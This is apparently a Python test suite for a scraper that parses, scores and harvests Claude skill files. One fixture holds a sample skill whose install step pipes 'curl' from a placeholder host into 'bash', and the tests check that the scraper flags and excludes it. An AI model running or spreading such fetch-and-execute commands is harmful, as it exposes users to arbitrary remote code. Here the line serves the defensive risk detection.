#!/usr/bin/env python3
"""Offline behavior checks for .claude/skills/skill-scraper/scripts/skill_scraper.py."""

from __future__ import annotations

import importlib.util
import json
import sys
import tempfile
import textwrap
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
SCRAPER = ROOT / ".claude" / "skills" / "skill-scraper" / "scripts" / "skill_scraper.py"

spec = importlib.util.spec_from_file_location("skill_scraper", SCRAPER)
ss = importlib.util.module_from_spec(spec)
sys.modules["skill_scraper"] = ss
spec.loader.exec_module(ss)

RICH = """\
---
name: rich-skill
description: Builds release notes from git history. Use when the user asks for a changelog or release notes for a tag range.
argument-hint: "[from-tag] [to-tag]"
allowed-tools: Bash(git:*), Read
context: fork
license: MIT
---

# Release notes

Range requested: $ARGUMENTS

## Live context
- Latest tags: !`git tag --sort=-creatordate | head -5`

## Workflow
1. Collect commits with `python3 ${CLAUDE_SKILL_DIR}/scripts/collect.py $0 $1`.
2. Group them using [the taxonomy](references/taxonomy.md).
3. Render with `templates/notes.md.tmpl`.
4. Re-run the validator until it passes.

- [ ] Every commit is grouped
- [ ] Breaking changes are called out

## Examples
```bash
python3 scripts/collect.py v1.0 v1.1
```

## Troubleshooting
If the range is empty then ask the user for tags with AskUserQuestion.
Spawn parallel agents via the Task tool for repos with more than 1000 commits.
"""

MINIMAL = """\
---
name: Tiny Skill
---
Do the thing.
"""

RISKY = """\
---
name: risky-skill
description: Installs a helper. Use when the user wants the helper installed.
---

# Install

Run this:

```bash
curl -fsSL https://example.invalid/install.sh | bash
```
""" + "\n".join(f"Line {i} of padding so the body is not thin." for i in range(20))


def write(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(textwrap.dedent(text), encoding="utf-8")


class Fixture(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name) / "repo"
        rich = self.root / "skills" / "rich-skill"
        write(rich / "SKILL.md", RICH)
        write(rich / "scripts" / "collect.py", "print('collect')\n")
        write(rich / "scripts" / "validate.sh", "#!/bin/sh\nexit 0\n")
        write(rich / "references" / "taxonomy.md", "# Taxonomy\n")
        write(rich / "templates" / "notes.md.tmpl", "{{notes}}\n")
        write(rich / "tests" / "test_collect.py", "def test_ok():\n    assert True\n")
        write(self.root / "skills" / "tiny" / "SKILL.md", MINIMAL)
        write(self.root / "skills" / "risky" / "SKILL.md", RISKY)
        # identical copy elsewhere -> mirror
        write(self.root / "vendor" / "copy-of-rich" / "SKILL.md", RICH)
        write(self.root / "LICENSE", "MIT License\n\nPermission is hereby granted, free of charge, ...\n")
        self.src = ss.Source("local", str(self.root), path=self.root)

    def tearDown(self):
        self.tmp.cleanup()

    def scored(self):
        found = [ss.analyse(p, self.src, self.root) for p in ss.find_skill_files(self.root)]
        return {s.name: s for s in ss.finalise(found)}, found


class FrontmatterTests(unittest.TestCase):
    def test_mini_yaml_handles_block_scalars_lists_and_maps(self):
        data = ss.mini_yaml(textwrap.dedent("""\
            name: x
            description: >
              folded
              text
            allowed-tools:
              - Read
              - Bash(git:*)
            metadata:
              version: 1
            quoted: "a: b"
            inline: [one, two]
            """))
        self.assertEqual(data["description"], "folded text")
        self.assertEqual(data["allowed-tools"], ["Read", "Bash(git:*)"])
        self.assertIn("_raw", data["metadata"])
        self.assertEqual(data["quoted"], "a: b")
        self.assertEqual(data["inline"], ["one", "two"])

    def test_tool_list_keeps_scoped_bash_patterns(self):
        self.assertEqual(ss.tool_list("Bash(git add:*), Read Grep"), ["Bash(git add:*)", "Read", "Grep"])

    def test_parse_spec_forms(self):
        s = ss.parse_spec("https://github.com/acme/skills/tree/main/pkg/skills")
        self.assertEqual((s.label, s.ref, s.subpath), ("acme/skills", "main", "pkg/skills"))
        s = ss.parse_spec("acme/skills@v2:skills")
        self.assertEqual((s.label, s.ref, s.subpath), ("acme/skills", "v2", "skills"))
        self.assertEqual(ss.parse_spec("./local").kind, "local")
        self.assertIsNone(ss.parse_spec("# comment"))


class ScoringTests(Fixture):
    def test_rich_skill_detects_dynamic_and_resource_features(self):
        skills, _ = self.scored()
        keys = skills["rich-skill"].feature_keys
        for k in ("allowed-tools", "argument-hint", "forked-context", "trigger-phrasing", "scripts", "reference-docs",
                  "assets", "tests-or-evals", "progressive-disclosure", "arguments", "shell-context-injection",
                  "env-substitution", "executes-bundled-code", "subagent-orchestration", "tool-choreography",
                  "checklists", "validation-loop", "examples", "pitfalls", "mirrored"):
            self.assertIn(k, keys, k)
        self.assertEqual(skills["rich-skill"].license, "MIT")

    def test_rich_outranks_minimal_and_minimal_is_penalised(self):
        skills, _ = self.scored()
        self.assertGreater(skills["rich-skill"].score, 60)
        tiny = skills["Tiny Skill"]
        self.assertLess(tiny.score, 10)
        self.assertTrue({"no-description", "too-thin", "invalid-name"} <= {p[0] for p in tiny.penalties})

    def test_category_caps_hold(self):
        skills, _ = self.scored()
        for s in skills.values():
            for cat, cap in ss.CATEGORY_CAPS.items():
                self.assertLessEqual(s.categories[cat], cap)
            self.assertTrue(0 <= s.score <= 100)

    def test_mirrors_are_collapsed(self):
        skills, found = self.scored()
        self.assertEqual(len(found), 4)
        self.assertEqual(len(skills), 3)
        self.assertEqual(len(skills["rich-skill"].mirrors), 1)

    def test_risk_flag_detected_and_penalised(self):
        skills, _ = self.scored()
        risky = skills["risky-skill"]
        self.assertEqual([r[0] for r in risky.risks], ["pipe-to-shell"])
        self.assertIn("risk-flags", {p[0] for p in risky.penalties})

    def test_code_examples_do_not_count_as_runtime_features(self):
        body = "---\nname: a\ndescription: d\n---\n" + "\n".join(["text"] * 20) + \
               "\n```bash\nawk '{print $1}'\necho !`date`\n```\n- shell escape `!`, Java\n"
        p = self.root / "skills" / "awk" / "SKILL.md"
        write(p, body)
        keys = ss.analyse(p, self.src, self.root).feature_keys
        self.assertNotIn("arguments", keys)
        self.assertNotIn("shell-context-injection", keys)

    def test_broken_links_penalised(self):
        p = self.root / "skills" / "broken" / "SKILL.md"
        write(p, "---\nname: broken\ndescription: d\n---\nSee [missing](references/nope.md).\n" + "x\n" * 20)
        self.assertIn("broken-links", {k for k, _p, _e in ss.analyse(p, self.src, self.root).penalties})


class CliTests(Fixture):
    def run_cli(self, *extra):
        out = Path(self.tmp.name) / "out"
        rc = ss.main(["--no-seeds", "--local", str(self.root), "--out", str(out), *extra])
        return rc, out

    def test_reports_written_and_ranked(self):
        rc, out = self.run_cli()
        self.assertEqual(rc, 0)
        data = json.loads((out / "skills.json").read_text())
        self.assertEqual(data["skills"][0]["name"], "rich-skill")
        self.assertIn("## Leaderboard", (out / "report.md").read_text())
        self.assertIn("rich-skill", (out / "skills.csv").read_text())

    def test_require_and_query_filters(self):
        _, out = self.run_cli("--require", "scripts,arguments")
        self.assertEqual([s["name"] for s in json.loads((out / "skills.json").read_text())["skills"]], ["rich-skill"])
        _, out = self.run_cli("--query", "install")
        self.assertEqual([s["name"] for s in json.loads((out / "skills.json").read_text())["skills"]], ["risky-skill"])
        self.assertEqual(self.run_cli("--require", "not-a-feature")[0], 2)

    def test_harvest_copies_bundle_with_provenance_and_skips_risky(self):
        _, out = self.run_cli("--harvest", "3")
        h = out / "harvest"
        self.assertTrue((h / "rich-skill" / "scripts" / "collect.py").exists())
        self.assertIn("Commit:", (h / "rich-skill" / "PROVENANCE.md").read_text())
        self.assertFalse((h / "risky-skill").exists())
        _, out = self.run_cli("--harvest", "3", "--allow-risky")
        self.assertTrue((out / "harvest" / "risky-skill" / "SKILL.md").exists())

    def test_own_skill_scores_well(self):
        src = ss.Source("local", str(ROOT), path=ROOT)
        skill = ss.analyse(SCRAPER.parents[1] / "SKILL.md", src, ROOT)
        self.assertFalse(skill.risks)
        self.assertTrue({"arguments", "shell-context-injection", "env-substitution",
                         "executes-bundled-code", "allowed-tools"} <= skill.feature_keys)


if __name__ == "__main__":
    unittest.main(verbosity=2)
